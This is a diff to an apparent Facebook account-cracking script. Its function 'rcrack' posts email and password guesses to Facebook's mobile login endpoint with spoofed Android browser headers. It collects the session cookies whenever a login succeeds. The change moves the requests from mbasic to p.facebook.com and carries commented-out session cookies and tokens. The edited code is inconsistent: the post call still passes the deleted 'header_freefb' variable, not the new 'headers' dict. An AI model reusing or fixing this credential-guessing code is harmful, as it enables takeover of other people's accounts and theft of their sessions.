@@ -226,23 +226,31 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
-            "method": 'GET',
-            "scheme": 'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'cache-control': 'max-age=0',
-            # 'cookie': 'datr=zwaiY8oIpRJmusfwcUYR3gcl; sb=zwaiY5XKI6dYvdiAT8MfIAzF; wd=979x1831; dpr=2.34375; fr=0FGFgDcD2x3MSPEbJ..BjogbP.Fh.AAA.0.0.Bjt7jq.AWXveghp-AI',
-            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
+            headers = {
+    'authority': 'p.facebook.com',
+    'method' : 'POST',
+    'scheme' : 'https',
+    'path' : '/login/device-based/login/async/?refsrc=deprecated&lwv=100',
+    'accept': '*/*',
+    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+    'content-type': 'application/x-www-form-urlencoded',
+    # Requests sorts cookies= alphabetically
+    # 'cookie': 'dbln=%7B%22100089578076485%22%3A%22MOoNb8hm%22%7D; datr=wZ_pY9aMkf8AFEgFXkpkr-oo; sb=wZ_pY2-V7WuYpyeZg3yMObfx; locale=en_US; m_pixel_ratio=1.75; x-referer=eyJyIjoiL2Jvb2ttYXJrcy8%2FcGFpcHY9MCZlYXY9QWZaTjZfdzdQYnh6d3RRd2V4RHlQQ051UTFDR1FpOE9pMlpORUw4VGNWZFJkR3VPTXBtM0RzV1RMMFJIQVQwYWdaZyIsImgiOiIvYm9va21hcmtzLz9wYWlwdj0wJmVhdj1BZlpONl93N1BieHp3dFF3ZXhEeVBDTnVRMUNHUWk4T2kyWk5FTDhUY1ZkUmRHdU9NcG0zRHNXVEwwUkhBVDBhZ1pnIiwicyI6InAifQ%3D%3D; dnonce=AWmRzZo0AiAbuXjy8tuAJqu71yLTdiEUfj0E37MPm7mO0NFK6TWLKw3Uupqr5Sj7FXslwJqIDd9tDBLLdXptOud-; wd=412x772; fr=0Io6O5s8KoLgbsXZd.AWUMdK9PHW1_k4WpiAgN8svRI0c.Bj9FoG.jZ.AAA.0.0.Bj-Ddz.AWVkUsswyJ8',
+    'origin': 'https://p.facebook.com',
+    'referer': 'https://p.facebook.com/login/?ref=dbl&fl&login_from_aymh=1',
+    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-origin',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+    'x-asbd-id': '198387',
+    'x-fb-lsd': 'AVr2YNLdqNg',
+    'x-requested-with': 'XMLHttpRequest',
+    'x-response-format': 'JSONStream',
+}
+            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
